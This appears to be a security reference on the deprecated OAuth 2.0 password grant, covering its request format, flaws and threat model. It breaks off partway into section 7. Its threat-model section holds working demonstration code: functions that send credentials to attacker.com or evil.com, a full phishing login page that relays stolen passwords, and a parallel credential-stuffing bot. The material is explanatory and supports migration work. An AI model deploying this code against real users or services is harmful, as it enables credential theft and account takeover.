# **WARNING:** [DEPRECATED] Resource Owner Password Credentials Flow **WARNING:**

## **CRITICAL DEPRECATION NOTICE**

```
================================================================================
                    THIS FLOW VIOLATES OAUTH PRINCIPLES
================================================================================

  **WARNING:**  THIS FLOW IS DEPRECATED AND MUST NOT BE USED  **WARNING:**

  Status: REMOVED from OAuth 2.1
  Security: FUNDAMENTALLY INSECURE - Exposes user credentials to client
  Principle Violated: OAuth exists specifically to AVOID credential sharing
  Recommendation: MIGRATE IMMEDIATELY to Authorization Code + PKCE

  This document exists ONLY for:
  * Maintaining legacy enterprise systems (unfortunately)
  * Security audits of older implementations
  * Understanding why this approach is dangerous
  * Planning migration away from password grant

  DO NOT implement this flow in new applications.
  DO NOT recommend this flow to others under any circumstances.
  DO migrate existing implementations with extreme urgency.

  "If OAuth had a Terms of Service, using the Password Grant would violate it."
  - OAuth Security Best Current Practice

================================================================================
```

**Deprecation References:**
- **Security BCP (draft-ietf-oauth-security-topics-27) §2.4:** "The resource owner password credentials grant MUST NOT be used."
- **OAuth 2.1:** Resource Owner Password Credentials Grant completely removed from specification
- **RFC 6749 §4.3:** Original specification (now deprecated)
- **IETF OAuth Working Group:** Strongly discourages any use of this grant type

**Migration Required:** See Section 9 for migration paths to secure OAuth flows.

---

> *"In the beginning, there was HTTP Basic Authentication, and it was bad. Then OAuth was created to solve the credential-sharing problem. Then someone created the Resource Owner Password Credentials Grant, which brought back the credential-sharing problem. This has made a lot of security professionals very angry and been widely regarded as a bad move."*

---

## Table of Contents

1. [Overview](#1-overview)
2. [Why This Flow Exists (Historical Context)](#2-why-this-flow-exists-historical-context)
3. [Flow Diagram](#3-flow-diagram)
4. [Token Request](#4-token-request-rfc-6749-432)
5. [Token Response](#5-token-response-rfc-6749-433)
6. [Why This Flow is Deprecated](#6-why-this-flow-is-deprecated-fundamental-issues)
7. [Security Threat Model](#7-security-threat-model-for-password-flow)
8. [Limited Legitimate Use Cases](#8-limited-legitimate-use-cases-extremely-rare)
9. [Migration Paths](#9-migration-paths)
10. [Implementation Requirements (Legacy Only)](#10-implementation-requirements-if-forced-to-support-legacy)
11. [Validation Rules](#11-validation-rules-exact-spec-requirements)
12. [Comparison with Proper OAuth Flows](#12-comparison-with-proper-oauth-flows)
13. [Example Scenarios](#13-example-scenarios)
14. [Regulatory and Compliance Considerations](#14-regulatory-and-compliance-considerations)

---

## 1. Overview

The OAuth 2.0 Resource Owner Password Credentials Grant (RFC 6749 §4.3) is an authorization flow where the user provides their username and password directly to the client application, which then exchanges these credentials for an access token at the authorization server's token endpoint.

### **WARNING:** Current Status: DEPRECATED

| Specification | Status |
|---------------|--------|
| RFC 6749 §4.3 | Defined but deprecated by Security BCP |
| Security BCP §2.4 | **MUST NOT be used** |
| OAuth 2.1 | **REMOVED** (not included in specification) |
| Industry consensus | **NEVER USE - violates OAuth principles** |

### The Core Problem

**OAuth was created specifically to prevent credential sharing between users and client applications.**

This flow does the exact opposite: it requires users to share their credentials with the client.

```
Traditional Authentication (Pre-OAuth):
User -> gives password to -> Client App -> uses password to -> Resource Server
Problem: Client has user's password!

OAuth 2.0 Purpose:
User -> authenticates with -> Auth Server -> issues token to -> Client App
Solution: Client NEVER sees user's password!

Password Grant (Defeats OAuth):
User -> gives password to -> Client App -> sends to -> Auth Server
Result: We're back to the original problem OAuth was meant to solve!
```

### Key Characteristics

| Characteristic | Value | Security Impact |
|---------------|-------|-----------------|
| **User credentials exposed to client** | YES | **CRITICAL** - Violates OAuth core principle |
| **Consent screen** | None | **CRITICAL** - User cannot review permissions |
| **Client authentication** | Optional (public clients) | **HIGH** - Anyone can harvest credentials |
| **MFA support** | Difficult/impossible | **HIGH** - Cannot use modern security |
| **Federated identity support** | No | **HIGH** - Locked to password auth |
| **Phishing risk** | Extreme | **CRITICAL** - Trains users to give passwords to apps |

### Why It Was Created (Bad Reasoning)

**Problem in 2012:**
- Legacy systems migrating to OAuth
- Native mobile apps before web views were common
- "High trust" scenarios (same organization)

**Password Grant "Solution":**
- Allow clients to collect credentials
- Exchange for OAuth tokens
- "Bridge" to OAuth

**Why This "Solution" Failed:**
- Defeats the entire purpose of OAuth
- Creates worse security problems than it solves
- "High trust" is not an excuse for bad security
- Better alternatives now exist (PKCE, Device Flow)

---

## 2. Why This Flow Exists (Historical Context)

### Timeline of Password Grant

```
2012: OAuth 2.0 (RFC 6749) published with Password Grant
      |
      Problem: Legacy apps need to migrate to OAuth
      "Solution": Let apps collect passwords, exchange for tokens
      Justification: "High trust" scenarios
      |
2012-2015: Password Grant widely adopted for mobile apps
      |
      Security community: "This defeats OAuth's purpose!"
      |
2015-2018: Security researchers document fundamental flaws
      |
      Issues identified:
      * Credential exposure to clients
      * Phishing risk increase
      * MFA incompatibility
      * Federation incompatibility
      |
2019: OAuth Security BCP deprecates Password Grant
      |
      Guidance: "MUST NOT be used"
      Rationale: Violates OAuth principles
      |
2020-2024: OAuth 2.1 draft specification
      |
      Password Grant REMOVED from OAuth 2.1
      |
2024: Industry consensus: NEVER use Password Grant
      |
      Even "legitimate" use cases should use Authorization Code + PKCE
```

### The Philosophical Problem

**OAuth's Core Principle:** Separate authentication from authorization. Users authenticate with the authorization server, not with client applications.

**Password Grant's Violation:** Users authenticate with the client application by giving it their credentials.

This is like:
- Giving your house keys to a food delivery service (OAuth: they ring doorbell)
- Giving your bank password to a budgeting app (OAuth: app requests read access)
- Giving your email password to a calendar app (OAuth: app requests calendar scope)

**The "High Trust" Fallacy:**
- "It's okay, it's our own app!" - Still creates phishing risk for users
- "Users trust us!" - Trust doesn't eliminate security vulnerabilities
- "We'll be careful!" - Organizational security changes, breaches happen

---

## 3. Flow Diagram

### **WARNING:** This flow exposes user credentials to the client application

```
+----------+                                      +------------------+
|          |                                      |                  |
|   User   |                                      | Client App       |
|          |                                      | (Native/Web)     |
+-----+----+                                      +--------+---------+
      |                                                    |
      |  (1) User enters credentials IN CLIENT APP        |
      |      Username: alice@example.com                  |
      |      Password: ************                       |
      |      **DANGER: Password visible to client**       |
      +---------------------------------------------------> 
      |                                                    |
      |                                         +----------v-----------+
      |                                         | Client collects:     |
      |                                         | * username           |
      |                                         | * password           |
      |                                         | **WARNING: Client    |
      |                                         |   now has password** |
      |                                         +----------+-----------+
      |                                                    |
      |                                                    | (2) POST /token
      |                                                    |     grant_type=password
      |                                                    |     username=alice@example.com
      |                                                    |     password=secret123
      |                                                    |     client_id=mobile_app
      |                                                    |
      |                                                    v
      |                                         +----------------------+
      |                                         |  Authorization       |
      |                                         |  Server              |
      |                                         |                      |
      |                                         | (3) Validates:       |
      |                                         |  * username/password |
      |                                         |  * client_id         |
      |                                         |                      |
      |                                         +----------+-----------+
      |                                                    |
      |                                                    | (4) Returns tokens
      |                                                    |     {
      |                                                    |       "access_token": "...",
      |                                                    |       "refresh_token": "...",
      |                                                    |       "expires_in": 3600
      |                                                    |     }
      |                                                    |
      |                                         +----------v-----------+
      |                                         | Client stores:       |
      |                                         | * access_token       |
      |                                         | * refresh_token      |
      |                                         |                      |
      |                                         | **DANGER: May also   |
      |                                         |  store password!**   |
      |                                         +----------+-----------+
      |                                                    |
      |                                                    | (5) Use access token
      |                                                    |
      |                                                    v
      |                                         +----------------------+
      |                                         |  Resource Server     |
      |  (6) Access protected resources        |                      |
      <-------------------------------------------+                      |
      |                                         +----------------------+


**CRITICAL SECURITY ISSUES IN THIS FLOW:**

1. **Step 1:** User enters password directly into client app
   - Client sees plaintext password
   - Client could log password
   - Trains users to enter passwords in apps (phishing risk)

2. **Step 2:** Client sends password over network
   - Even with HTTPS, client has handled password
   - Password may be logged in client
   - Client must be trusted with credentials

3. **No consent screen:**
   - User doesn't see what permissions they're granting
   - Blind trust in client application

4. **Potential password storage:**
   - Client may store password for "convenience"
   - Creates massive security vulnerability

5. **Cannot support MFA:**
   - Standard MFA flows require user interaction with auth server
   - Password grant bypasses auth server UI
```

### What's Wrong with This Picture?

| OAuth Principle | Password Grant Behavior | Result |
|----------------|------------------------|--------|
| Client never sees credentials | Client collects and handles password | **VIOLATION** |
| User consents to permissions | No consent screen | **VIOLATION** |
| Supports MFA | Difficult/impossible | **LIMITATION** |
| Supports federated identity | Cannot use SAML/social login | **LIMITATION** |
| Phishing resistant | Trains users to enter passwords in apps | **INCREASED RISK** |

---

## 4. Token Request (RFC 6749 §4.3.2)

### **WARNING:** DO NOT implement this in new applications

### HTTP Method and Endpoint

```http
POST /token HTTP/1.1
Host: authorization-server.example.com
Content-Type: application/x-www-form-urlencoded
```

### Parameters

| Parameter | RFC 2119 | Description | Spec Reference |
|-----------|----------|-------------|----------------|
| `grant_type` | **REQUIRED** | MUST be set to `password` | RFC 6749 §4.3.2 |
| `username` | **REQUIRED** | Resource owner username | RFC 6749 §4.3.2 |
| `password` | **REQUIRED** | Resource owner password | RFC 6749 §4.3.2 |
| `scope` | OPTIONAL | Requested scope | RFC 6749 §4.3.2 |

### Client Authentication

**Per RFC 6749 §3.2.1:**

| Client Type | Authentication Requirement | Method |
|-------------|---------------------------|--------|
| Confidential client | **MUST** authenticate | client_secret_basic, client_secret_post, etc. |
| Public client | Cannot authenticate | Include client_id in request body |

**Critical problem:** Public clients can harvest credentials without authentication.

### Example Token Request (Confidential Client)

```http
POST /token HTTP/1.1
Host: auth.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded

grant_type=password
&username=alice@example.com
&password=secret123
&scope=profile email
```

**Decoded Authorization header:**
```
client_id: s6BhdRkqt3
client_secret: gX1fBat3bV
```

### Example Token Request (Public Client)

```http
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=password
&username=alice@example.com
&password=secret123
&client_id=mobile_app_123
&scope=profile email
```

**Security issue:** No authentication of client_id. Anyone can create a malicious app claiming to be `mobile_app_123` and harvest credentials.

### Critical Security Note

**The password is transmitted in the POST body:**

```
password=secret123
```

While HTTPS encrypts the transmission, the fundamental issues remain:
1. **Client has handled the password** (could log it, store it, misuse it)
2. **Client must be trusted** with user's credentials
3. **User has given password to client** (phishing training)
4. **No consent screen** (user doesn't know what permissions they granted)

---

## 5. Token Response (RFC 6749 §4.3.3)

### Success Response

```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache

{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
  "scope": "profile email"
}
```

### Response Parameters

| Parameter | RFC 2119 | Description | Spec Reference |
|-----------|----------|-------------|----------------|
| `access_token` | **REQUIRED** | The access token | RFC 6749 §5.1 |
| `token_type` | **REQUIRED** | Token type (typically `Bearer`) | RFC 6749 §5.1 |
| `expires_in` | RECOMMENDED | Lifetime in seconds | RFC 6749 §5.1 |
| `refresh_token` | OPTIONAL | Refresh token (commonly issued) | RFC 6749 §5.1 |
| `scope` | OPTIONAL | Granted scope (if different from requested) | RFC 6749 §5.1 |

### Error Response

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json
Cache-Control: no-store

{
  "error": "invalid_grant",
  "error_description": "Invalid username or password"
}
```

### Error Codes

| Error Code | Description | Client Action | Spec Reference |
|------------|-------------|---------------|----------------|
| `invalid_grant` | Invalid username/password | Prompt user to re-enter credentials | RFC 6749 §5.2 |
| `invalid_client` | Client authentication failed | Check client credentials | RFC 6749 §5.2 |
| `unauthorized_client` | Client not authorized for password grant | Use different flow | RFC 6749 §5.2 |
| `invalid_scope` | Requested scope invalid/unknown | Request valid scope | RFC 6749 §5.2 |
| `invalid_request` | Malformed request | Fix request format | RFC 6749 §5.2 |

### Example Error Responses

#### Invalid Credentials

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "error": "invalid_grant",
  "error_description": "The provided username or password is incorrect"
}
```

#### Unauthorized Client

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "error": "unauthorized_client",
  "error_description": "This client is not authorized to use the password grant type"
}
```

**Note:** This error is actually a good thing - it means the authorization server has restricted password grant to specific clients (or ideally, disabled it entirely).

---

## 6. Why This Flow is Deprecated (Fundamental Issues)

### **CRITICAL:** The following issues are FUNDAMENTAL and CANNOT be adequately mitigated

**Per Security BCP §2.4:** "The resource owner password credentials grant MUST NOT be used. This grant type insecurely exposes the credentials of the resource owner to the client."

### 6.1 Exposes User Credentials to Client (Security BCP §2.4)

#### The Core OAuth Violation

**OAuth's entire purpose:** Keep user credentials secret from client applications.

**Password grant's behavior:** Give user credentials to client applications.

This is not a bug—it's the flow's design. And it fundamentally defeats OAuth.

#### What Can Go Wrong

```
User enters credentials in client:
username: alice@example.com
password: MySecretPassword123!

Client application now has:
✓ Alice's username
✓ Alice's plaintext password
✓ Complete access to Alice's account
✓ Ability to impersonate Alice anywhere
✓ Ability to log these credentials
✓ Ability to misuse these credentials
✓ Ability to store these credentials

Client could:
* Log password to analytics
* Send password to third-party service
* Store password in database
* Use password to access other services
* Share password with attackers if compromised
```

#### Even "Trusted" Clients Are Dangerous

**Scenario:** Bank's own mobile app

```
Year 1: Bank mobile app collects passwords
        "It's our app, we're trustworthy!"

Year 2: Bank app has analytics SDK
        Analytics SDK has vulnerability
        Credentials exposed to analytics company

Year 3: Analytics company breached
        Millions of banking credentials stolen

Result: "Trusted" first-party app created massive vulnerability
```

**Better approach:** Use Authorization Code + PKCE. App redirects to bank's auth page. App never sees password.

#### Phishing Training Problem

**Password grant trains users to do exactly what phishing attacks want:**

```
Legitimate app: "Enter your password here"
User: Enters password ✓

Phishing app: "Enter your password here"
User: Enters password ✓ (trained by legitimate apps!)
```

**With proper OAuth:**
```
Legitimate app: "Redirecting to bank.com to sign in..."
User: Sees bank.com in browser address bar ✓

Phishing app: "Redirecting to bank-login.evil.com..."
User: Sees unfamiliar domain, suspicious ✗
```

### 6.2 No Consent Screen

#### The Problem

Users have no visibility into what permissions they're granting.

**Password grant:**
```
App: "Enter your username and password"
User: Enters credentials
Result: App has ALL permissions user has, no review, no choice
```

**Proper OAuth:**
```
App: Redirects to authorization server
Authorization server: "MyApp wants to:
  * Read your profile
  * Read your email
  * Access your calendar
  
  Allow?"
User: Reviews and approves/denies specific permissions
```

#### Security Implications

| Without Consent Screen | With Consent Screen |
|----------------------|-------------------|
| User doesn't know what app can do | User explicitly approves each permission |
| App could request admin scope without user knowing | Admin scope would be prominently displayed |
| No opportunity to deny excessive permissions | User can deny if permissions seem excessive |
| Blind trust in application | Informed consent |

#### Real-World Example

```
Scenario: Calendar sync app

Password Grant:
1. User enters email password in app
2. App has complete email access
3. App can read ALL email (including sensitive business email)
4. User didn't realize app would read email

Authorization Code Flow:
1. User redirected to email provider
2. Consent screen: "CalendarApp wants to:
   * Read your calendar events
   * Create calendar events"
3. User: "Good, just calendar, not email"
4. User approves
5. App gets ONLY calendar access
```

### 6.3 Credential Storage Temptation

#### Why Clients Store Passwords

**The "remember me" problem:**
```
User: "I don't want to enter my password every time I open the app"

Developer thinks: "I'll just store the password!"

Result: Password in client storage
        * Plaintext? Disaster
        * Encrypted? Key stored with encrypted data
        * Hashed? Can't use it to re-authenticate
```

**With refresh tokens (proper OAuth):**
```
User: "I don't want to log in every time"

Developer: "Store the refresh token!"

Result: Refresh token in secure storage
        * Can be used to get new access tokens
        * Does NOT grant access to other services
        * Can be revoked without changing password
        * Expires independently of password
```

#### Detection in the Wild

```javascript
// **DANGER:** Common pattern in password grant implementations

// Store credentials for "convenience"
localStorage.setItem('username', username);  // Bad
localStorage.setItem('password', password);  // VERY BAD

// Later, silently re-authenticate
async function refreshSession() {
  const username = localStorage.getItem('username');
  const password = localStorage.getItem('password');
  
  return await fetch('/token', {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'password',
      username: username,
      password: password  // Using stored password!
    })
  });
}
```

**Security issues:**
- Password in browser storage (XSS vulnerability)
- Password persists across sessions
- Password exposed if device compromised
- User has no way to revoke access except changing password

### 6.4 MFA Incompatibility

#### The Technical Problem

Multi-factor authentication requires user interaction with the authentication server:
- Enter TOTP code
- Approve push notification
- Use hardware token
- Receive and enter SMS code

**Password grant bypasses the auth server's UI:**

```
Standard Login with MFA:
User -> Auth Server Web UI -> Enters password -> Auth Server validates
     -> Auth Server Web UI -> Prompts for MFA code -> User enters code
     -> Auth Server validates MFA -> Issues token

Password Grant:
User -> Client App -> Client collects password -> Sends to token endpoint
     -> Token endpoint validates password -> ???
     
Problem: No UI for MFA prompt!
```

#### Workarounds (All Bad)

**Bad workaround #1:** Custom MFA in password grant
```http
POST /token
grant_type=password
&username=alice@example.com
&password=secret123
&mfa_code=123456  <- Custom parameter
```

**Problems:**
- Not standardized
- Client sees MFA code
- Doesn't work with push notifications
- Doesn't work with hardware tokens
- Client must implement MFA UI

**Bad workaround #2:** Skip MFA for password grant
```
If grant_type == "password":
    skip_mfa = True  # Weakens security!
```

**Problems:**
- Defeats purpose of MFA
- Creates security bypass
- Attackers target password grant to avoid MFA

**Proper solution:** Use Authorization Code + PKCE
- Auth server handles MFA in its own UI
- Client never sees MFA codes
- Works with all MFA methods
- Standardized and secure

### 6.5 Password Change Issues

#### The Problem

When user changes password, all clients using password grant break.

```
Timeline:
Day 1: User sets password: "OldPassword123"
       Mobile app stores password
       Desktop app stores password
       Web app stores password

Day 5: User changes password to "NewPassword456"
       (maybe forced by security policy)

Day 5 + 1 minute:
       Mobile app tries to authenticate: FAIL
       Desktop app tries to authenticate: FAIL
       Web app tries to authenticate: FAIL
       
Result: User must manually update password in ALL apps
```

#### Refresh Tokens Don't Help

```
Day 1: Apps get access token + refresh token
Day 5: User changes password
Day 6: Apps' access tokens expire
       Apps try to use refresh token: FAIL
       (most auth servers invalidate refresh tokens on password change)

Result: All apps break anyway
```

**With proper OAuth:**
```
Day 1: Apps get access token + refresh token via auth code flow
Day 5: User changes password
Day 6: Apps' access tokens expire
       Apps use refresh token:
       * Some auth servers: Still works (tokens independent of password)
       * Other auth servers: Requires re-authentication
       * Either way: User authenticates via browser, not password in app
```

### 6.6 Identity Provider Limitations

#### Cannot Use Federated Identity

Password grant only works with username/password authentication.

**Cannot support:**
- SAML federation
- Social login (Google, Facebook, etc.)
- Corporate SSO
- Smart card authentication
- Biometric authentication
- Passwordless authentication

```
User: "I want to sign in with Google"
App using password grant: "Sorry, enter your username and password"
User: "But I don't have a password, I use Google sign-in"
App: "Tough luck"

App using Authorization Code:
User: "I want to sign in with Google"
App: Redirects to auth server
Auth server: "Choose sign-in method:"
  * Username/Password
  * Google
  * Corporate SSO
User: Clicks Google
Result: Seamless federated auth
```

#### Migration Lock-In

```
Company wants to migrate from passwords to:
* Passwordless (FIDO2/WebAuthn)
* Smart cards
* SSO with Azure AD

Apps using password grant:
* Must be completely rewritten
* Cannot migrate incrementally
* Users stuck with passwords

Apps using Authorization Code:
* No changes needed
* Auth server handles new methods
* Seamless migration
```

---

## 7. Security Threat Model for Password Flow

### **CRITICAL:** These vulnerabilities are FUNDAMENTAL to the flow's design

### 7.1 Credential Theft from Client (Security BCP §2.4)

#### Attack Description

Malicious or compromised client application steals user passwords.

**Attack variants:**
- Malicious app intentionally harvests credentials
- Legitimate app compromised (code injection, supply chain attack)
- Legitimate app has logging bug (passwords in logs)
- Developer adds analytics SDK (credentials sent to analytics)

#### Attack Sequence

```
1. User downloads app:
   - Could be intentionally malicious
   - Could be legitimate but compromised
   - Could be legitimate with security bug

2. User enters credentials:
   Username: alice@example.com
   Password: MySecretPassword123!

3. App code executes:
   // Malicious code hidden in app
   function authenticate(username, password) {
     // Send to auth server (normal behavior)
     getToken(username, password);
     
     // Also send to attacker (malicious behavior)
     fetch('https://evil.com/steal', {
       method: 'POST',
       body: JSON.stringify({ username, password })
     });
   }

4. Attacker receives credentials:
   - Username: alice@example.com
   - Password: MySecretPassword123!
   - Attacker now has full account access

5. Attacker uses credentials:
   - Login to victim's account
   - Access all services using same password
   - Perform actions as victim
   - Maintain persistence
```

#### Exploit Demonstration (Vulnerable Mode: `PASSWORD_GRANT` + `LOG_CREDENTIALS`)

```javascript
// Tool demonstrates: How password grant enables credential theft

// Legitimate-looking authentication function
async function authenticateUser(username, password) {
  try {
    // Request token (appears normal)
    const response = await fetch('https://auth.example.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'password',
        username: username,
        password: password,  // Client has plaintext password
        client_id: 'mobile_app'
      })
    });
    
    const tokens = await response.json();
    
    // **MALICIOUS CODE:** Log credentials
    // (Could be unintentional bug or intentional theft)
    console.log('User authenticated:', username, password);  // Logged!
    analytics.track('login', { username, password });  // Sent to analytics!
    
    // **MALICIOUS CODE:** Exfiltrate to attacker
    await fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({
        username: username,
        password: password,
        timestamp: Date.now(),
        app_version: '1.2.3'
      })
    });
    
    // Continue normal app flow
    return tokens;
  } catch (error) {
    console.error('Authentication failed');
  }
}

// Attack scenario
const credentials = {
  username: 'victim@example.com',
  password: 'SecretPassword123!'
};

// User enters credentials in app
await authenticateUser(credentials.username, credentials.password);

// Attacker's collection server receives:
// {
//   "username": "victim@example.com",
//   "password": "SecretPassword123!",
//   "timestamp": 1638360000000,
//   "app_version": "1.2.3"
// }

// Attacker uses stolen credentials everywhere
```

#### Why This Is Unfixable

**Fundamental issue:** Client MUST have the password to use password grant.

**Cannot be mitigated because:**
- Client code executes on user's device (attacker-controlled environment)
- Client must transmit password to auth server
- No way to verify client code hasn't been modified
- No way to prevent client from logging/storing password
- Code obfuscation doesn't prevent this (can be reverse-engineered)
- Even signed apps can be compromised via supply chain attacks

**With proper OAuth (Authorization Code + PKCE):**
- Client never sees password
- Authentication happens in browser
- Even compromised client can't steal password
- Malicious code in client only gets tokens, not credentials

### 7.2 Phishing via Client Impersonation

#### Attack Description

Attacker creates fake client application that looks legitimate and collects real credentials.

**Why password grant makes this worse:**
- Users trained to enter passwords in apps
- No way to verify app authenticity before entering password
- Users cannot distinguish legitimate from fake app

#### Attack Sequence

```
1. Attacker creates fake app:
   Name: "Bank Mobile Banking" (looks legitimate)
   Logo: Copied from real bank
   UI: Mimics real bank app

2. User downloads fake app:
   - From unofficial app store
   - Via phishing link
   - Via social engineering

3. Fake app prompts for credentials:
   "Sign in to Bank Mobile Banking"
   Username: ________________
   Password: ________________
   [Sign In Button]

4. User enters real credentials:
   Username: alice@example.com
   Password: RealBankPassword123!
   
   (User trained by real apps to do this!)

5. Fake app collects credentials:
   POST https://attacker.com/harvest
   {
     "victim": "alice@example.com",
     "password": "RealBankPassword123!",
     "source": "fake_bank_app"
   }

6. Fake app can:
   Option A: Show error message, user thinks service is down
   Option B: Actually authenticate with real auth server,
             app works normally (user doesn't suspect theft)

7. Attacker uses stolen credentials:
   - Login to real bank
   - Transfer funds
   - Access other services (if password reused)
```

#### Exploit Demonstration (Vulnerable Mode: `PASSWORD_GRANT` + `FAKE_CLIENT`)

```javascript
// Tool demonstrates: Phishing attack targeting password grant users

// Fake banking app HTML
const fakeAppHTML = `
<!DOCTYPE html>
<html>
<head>
  <title>Bank Mobile Banking</title>
  <style>
    /* Mimics real bank app styling */
    body {
      font-family: Arial, sans-serif;
      background: #0066cc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-form {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    .logo {
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      color: #0066cc;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-form">
    <div class="logo">🏦 Bank of Example</div>
    <h2>Sign In</h2>
    <form id="loginForm">
      <input type="email" id="username" placeholder="Email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
  </div>
  
  <script>
    document.getElementById('loginForm').onsubmit = async (e) => {
      e.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      // **MALICIOUS:** Send to attacker's server
      await fetch('https://attacker.com/phish', {
        method: 'POST',
        body: JSON.stringify({ username, password })
      });
      
      // Option 1: Show fake error
      // alert('Service temporarily unavailable. Please try again later.');
      
      // Option 2: Actually authenticate (stealthier)
      // Forward to real auth server, user doesn't suspect theft
      const response = await fetch('https://real-bank.com/token', {
        method: 'POST',
        body: new URLSearchParams({
          grant_type: 'password',
          username: username,
          password: password,
          client_id: 'fake_client_id'
        })
      });
      
      if (response.ok) {
        // Credentials valid - app "works"
        // User doesn't know credentials were stolen
        window.location = '/dashboard';
      }
    };
  </script>
</body>
</html>
`;

// Victim visits fake app, enters credentials
// Attacker receives:
// {
//   "username": "victim@bank.com",
//   "password": "MyBankPassword123!",
//   "timestamp": 1638360000,
//   "ip": "192.0.2.1"
// }

// Attack succeeds because:
// 1. User trained to enter password in apps (password grant does this)
// 2. No browser address bar to verify domain
// 3. No way to distinguish fake from real before entering password
```

#### Why This Is Worse with Password Grant

**With Authorization Code Flow:**
```
1. User clicks "Sign In" in app
2. App opens browser to: https://real-bank.com/authorize
3. User sees real bank domain in browser address bar
4. User can verify certificate, check URL carefully
5. Fake app would show: https://fake-bank.com/authorize
6. User (if careful) notices wrong domain
```

**With Password Grant:**
```
1. User clicks "Sign In" in app
2. App shows password form inside app
3. NO browser, NO address bar, NO domain to verify
4. User has NO way to verify authenticity before entering password
5. Fake app looks identical to real app
6. User enters password = credentials stolen
```

### 7.3 Credential Stuffing

#### Attack Description

Attacker uses lists of stolen username/password combinations to attempt authentication via password grant endpoint.

**Attack characteristics:**
- Automated attacks using credential lists
- Can test thousands of credentials per minute
- Difficult to distinguish from legitimate traffic
- Common credential lists available from data breaches

#### Attack Sequence

```
1. Attacker obtains credential list:
   - From data breach of other service
   - From password dump databases
   - From previous phishing campaigns
   
   Credentials:
   alice@example.com:Password123
   bob@example.com:Qwerty456
   charlie@example.com:Letmein789
   ... (millions more)

2. Attacker targets password grant endpoint:
   For each credential in list:
     POST /token
     grant_type=password
     username=credential.username
     password=credential.password
     client_id=mobile_app

3. Track successful authentications:
   alice@example.com:Password123 -> SUCCESS (token received)
   bob@example.com:Qwerty456 -> FAIL
   charlie@example.com:Letmein789 -> SUCCESS (token received)
   
4. Use valid credentials:
   - Access accounts
   - Perform fraud
   - Sell access
   - Use as pivot point
```

#### Exploit Demonstration (Vulnerable Mode: `PASSWORD_GRANT` + `NO_RATE_LIMITING`)

```javascript
// Tool demonstrates: Credential stuffing attack

// Simulated credential list (from previous breach)
const stolenCredentials = [
  { username: 'alice@example.com', password: 'Password123' },
  { username: 'bob@example.com', password: 'Qwerty456' },
  { username: 'charlie@example.com', password: 'Welcome1' },
  { username: 'diana@example.com', password: 'Abc123456' },
  // ... thousands or millions more from breach databases
];

// Credential stuffing bot
async function credentialStuffingAttack(tokenEndpoint, credentials) {
  const validAccounts = [];
  const concurrentRequests = 100;  // Parallel attacks
  
  // Process credentials in batches
  for (let i = 0; i < credentials.length; i += concurrentRequests) {
    const batch = credentials.slice(i, i + concurrentRequests);
    
    const promises = batch.map(async (cred) => {
      try {
        const response = await fetch(tokenEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'password',
            username: cred.username,
            password: cred.password,
            client_id: 'mobile_app'  // May not even need valid client_id
          })
        });
        
        if (response.ok) {
          const tokens = await response.json();
          
          // Found valid credential!
          validAccounts.push({
            username: cred.username,
            password: cred.password,
            access_token: tokens.access_token,
            refresh_token: tokens.refresh_token
          });
          
          console.log(`[+] Valid: ${cred.username}:${cred.password}`);
        }
      } catch (error) {
        // Ignore errors, move to next credential
      }
    });
    
    await Promise.all(promises);
    
    // Brief delay to avoid detection (if rate limiting exists)
    await sleep(100);
  }
  
  return validAccounts;
}

// Execute attack
const validAccounts = await credentialStuffingAttack(
  'https://api.example.com/token',
  stolenCredentials
);

console.log(`Found ${validAccounts.length} valid accounts`);

// Use valid accounts
for (const account of validAccounts) {
  // Access user data
  const response = await fetch('https://api.example.com/user/profile', {
    headers: {
      'Authorization': `Bearer ${account.access_token}`
    }
  });
  
  const profile = await response.json();
  console.log(`Account ${account.username}:`, profile);
  
  // Perform fraudulent actions
  // Exfiltrate data
  // Sell access
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
```

#### Attempted Mitigation (Insufficient)

**Rate limiting helps but doesn't solve the problem:**

```javascript
// Server-side rate limiting
const rateLimiter = {
  attempts: new Map(),  // IP -> attempt count
  
  check(ip) {
    const count = this.attempts.get(ip) || 0;
    
    if (count > 10) {  // Max 10 attempts per minute
      return { allowed: false, error: 'too_many_requests' };
    }
    
    this.attempts.set(ip, count + 1);
    setTimeout(() => {
      this.attempts.set(ip, Math.max(0, this.attempts.get(ip) - 1));
    }, 60000);  // Decay over 1 minute
    
    return { allowed: true };
  }
};

// Problems with this mitigation:
// 1. Attacker uses many IPs (botnets, proxies)
// 2. Rate limit too strict -> blocks legitimate users
// 3. Rate limit too lenient -> doesn't stop attack
// 4. Distributed attack evades IP-based limits
```

**Better solution:** Use Authorization Code + PKCE
- Browser-based authentication
- Can implement CAPTCHAs
- Can use device fingerprinting
- Can show security challenges
- Much harder to automate

### 7.4 Man-in-the-Middle Credential Capture

#### Attack Description

Even with HTTPS, the password grant creates a larger attack surface for credential capture.

**Attack points:**
- Compromised client (sees password before HTTPS)
